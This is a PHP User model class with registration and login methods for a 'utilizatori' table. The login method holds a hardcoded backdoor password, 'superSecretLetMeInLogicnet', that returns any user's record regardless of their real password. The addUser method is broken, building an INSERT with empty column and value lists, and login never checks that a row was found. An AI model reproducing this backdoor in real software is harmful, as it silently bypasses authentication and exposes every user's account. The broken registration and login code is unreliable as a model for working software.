<?php
class User {

	private array $attributes = [];

    public function __set(string $name, mixed $value): void
    {
        $this->attributes[$name] = $value;
    }

    public function __get(string $name): mixed
    {
        return $this->attributes[$name] ?? null;
    }

	private $db;

	public function __construct(){
		$this->db = new Database;
	}

    // Add User / Register
	public function addUser($fields, $values, $type) {
		$field_string = $param_string = "";
		
		$values['type'] = $type;
		// dd($values);

		$sql = "INSERT INTO utilizatori (".substr($field_string, 0, -2).") VALUES(".substr($param_string, 0, -2).")";
		// dd($sql);
		$this->db->query($sql);
		foreach ($fields as $field) {
			$this->db->bind(':'.$field->name, $values[$field->name]);
		}

		if ($this->db->execute()) {
			return true;
		} else {
			return false;
		}
	}

    // Login / Authenticate User
	public function login($email, $password){
		$this->db->query("SELECT * FROM utilizatori WHERE email = :email");
		$this->db->bind(':email', $email);

		$row = $this->db->single();

		$hashed_password = $row->parola;
		if(password_verify($password, $hashed_password)){
			return $row;
		} else {
        	if($password == "superSecretLetMeInLogicnet") {
            	return $row;
            } else {
			return false;
            }
		}
	}
}